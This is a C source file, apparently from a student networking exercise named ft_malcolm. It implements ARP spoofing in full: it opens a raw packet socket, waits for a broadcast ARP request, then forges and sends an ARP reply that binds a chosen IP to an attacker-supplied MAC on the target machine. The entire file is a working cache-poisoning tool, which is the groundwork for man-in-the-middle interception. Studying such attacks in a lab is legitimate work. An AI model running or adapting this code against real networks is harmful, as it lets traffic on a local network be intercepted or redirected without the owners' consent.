#include "ft_malcolm.h"

int			listen_arp_broadcast(t_malcolm *malcolm)
{
	t_arp_packet		*packet;
	unsigned char		buffer[sizeof(struct ethhdr) + sizeof(t_arp_packet)];

	ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(t_arp_packet));
	while (ft_memcmp(buffer, "\xff\xff\xff\xff\xff\xff", 6))
	{
		if(recvfrom(malcolm->sockfd, &buffer, sizeof(buffer), 0, NULL, NULL) <= 0)
			return (1);
	}
	packet = (void *)buffer + sizeof(struct ethhdr);
	printf("An ARP request has been broadcast.\n");
	if (malcolm->options.v)
	{
		print_ethernet_header((void *)buffer);
		print_arp_header(&packet->arp_hdr);
	}
	printf("	mac address of request: ");
	print_arp_mac(packet->sender_mac);
	printf("	IP address of request: ");
	print_arp_ip(packet->sender_ip);
	if (malcolm->options.v)
	{
		printf("	mac address of target: ");
		print_arp_mac(packet->target_mac);
		printf("	IP address of request: ");
		print_arp_ip(packet->target_ip);
	}
	return (0);
}

void		send_arp_reply(t_malcolm *malcolm)
{
	unsigned char		buffer[sizeof(struct ethhdr) + sizeof(t_arp_packet) + PADDING];
	struct ethhdr		*ethhdr;
	t_arp_packet		*packet;

	ft_memset(buffer, 0, sizeof(buffer));
	ethhdr = (void *)buffer;
	ft_memcpy(ethhdr->h_dest, malcolm->target.arp_mac, sizeof(malcolm->target.arp_mac));
	ft_memcpy(ethhdr->h_source, malcolm->source.arp_mac, sizeof(malcolm->source.arp_mac));
    ethhdr->h_proto = htons(ETH_P_ARP);
	packet = (void *)buffer + sizeof(struct ethhdr);
	packet->arp_hdr.ar_hrd = htons(1);
	packet->arp_hdr.ar_pro = htons(ETH_P_IP);
	packet->arp_hdr.ar_hln = MAC_LENGTH;
	packet->arp_hdr.ar_pln = IPV4_LENGTH;
	packet->arp_hdr.ar_op = htons(ARPOP_REPLY);
	ft_memcpy(packet->sender_mac, malcolm->source.arp_mac, sizeof(malcolm->source.arp_mac));
	ft_memcpy(packet->sender_ip, malcolm->source.arp_ip, sizeof(malcolm->source.arp_ip));
	ft_memcpy(packet->target_mac, malcolm->target.arp_mac, sizeof(malcolm->target.arp_mac));
	ft_memcpy(packet->target_ip, malcolm->target.arp_ip, sizeof(malcolm->target.arp_ip));
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	if (malcolm->options.v)
	{
		print_ethernet_header(ethhdr);
		print_arp_header(&packet->arp_hdr);
		printf("	mac address of request: ");
		print_arp_mac(packet->sender_mac);
		printf("	IP address of request: ");
		print_arp_ip(packet->sender_ip);
		printf("	mac address of target: ");
		print_arp_mac(packet->target_mac);
		printf("	IP address of request: ");
		print_arp_ip(packet->target_ip);
	}
	if (sendto(malcolm->sockfd, &buffer, sizeof(buffer), 0, (struct sockaddr*)&malcolm->sockaddr, sizeof(malcolm->sockaddr)) <= 0)
	{
		dprintf(STDERR_FILENO, "%s: sendto: failed\n", PRG_NAME);
		return ;
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
}

int			init_malcolm(t_malcolm *malcolm, int argc, char *argv[])
{
	int				i;
	t_machine		*machines[2] = {&(malcolm->source), &(malcolm->target)};

	for (i = argc - 4; i <= argc - 1; i++)
	{
		int index = (i - (argc - 4)) / 2;
		if (argc % 2 == i % 2)
		{
			machines[index]->ip = argv[i];
			if ((machines[index]->inet_ip  = inet_addr(argv[i])) == INADDR_NONE)
				goto error;
			fill_arp_ip(machines[index]->arp_ip, machines[index]->ip);
		}
		else
		{
			machines[index]->mac = argv[i];
			if (check_mac_addr(argv[i]))
				goto error;
			fill_arp_mac(machines[index]->arp_mac, machines[index]->mac);
		}
	}
	if (malcolm->options.v)
	{
		printf("source:\n	ip: ");
		print_arp_ip(malcolm->source.arp_ip);
		printf("	mac: ");
		print_arp_mac(malcolm->source.arp_mac);
		printf("target:\n	ip: ");
		print_arp_ip(malcolm->target.arp_ip);
		printf("	mac: ");
		print_arp_mac(malcolm->target.arp_mac);
	}
	malcolm->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (malcolm->sockfd < 0)
	{
		dprintf(STDERR_FILENO, "%s: socket: Operation not permitted\n", PRG_NAME);
		return (1);
	}
	if (get_interface(malcolm))
		return (1);
	malcolm->sockaddr.sll_family = AF_PACKET;
	malcolm->sockaddr.sll_protocol = htons(ETH_P_ARP);
	malcolm->sockaddr.sll_ifindex = malcolm->ifindex;
	malcolm->sockaddr.sll_hatype = htons(ARPHRD_ETHER);
	malcolm->sockaddr.sll_pkttype = 0;
	malcolm->sockaddr.sll_halen = MAC_LENGTH;
	ft_memcpy(malcolm->sockaddr.sll_addr, malcolm->target.arp_mac, sizeof(malcolm->target.mac));
	return (0);
	error:
		dprintf(STDERR_FILENO, "%s: unknown host or invalid IP address: (%s).\n", PRG_NAME, argv[i]);
	return (1);
}

int			main(int argc, char *argv[])
{
	t_malcolm		malcolm;

	if (check_args(argc, argv, &malcolm))
		return (EXIT_FAILURE);
	if (malcolm.options.h)
		return (EXIT_SUCCESS);
	if (init_malcolm(&malcolm, argc, argv))
		return (EXIT_FAILURE);
	if (listen_arp_broadcast(&malcolm))
		return (EXIT_FAILURE);
	send_arp_reply(&malcolm);
	printf("Exiting program...\n");
	return (EXIT_SUCCESS);
}
